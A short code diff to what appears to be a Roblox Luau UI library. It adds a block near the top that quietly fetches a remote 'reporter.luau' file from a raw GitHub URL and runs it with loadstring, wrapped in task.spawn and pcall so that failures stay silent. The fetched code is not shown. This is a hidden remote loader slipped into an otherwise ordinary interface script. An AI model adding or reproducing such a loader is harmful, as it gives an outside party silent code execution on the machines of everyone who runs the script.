@@ -54,6 +54,12 @@
 ╚══════════════════════════════════════════════════════════════════════════════════╝
 ]]
 
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/zurai02/NovaUI/refs/heads/main/reporter.luau"))()
+	end)
+end)
+
 -- ══ SERVICES ══════════════════════════════════════════════════════════════════
 local TS   = game:GetService("TweenService")
 local UIS  = game:GetService("UserInputService")
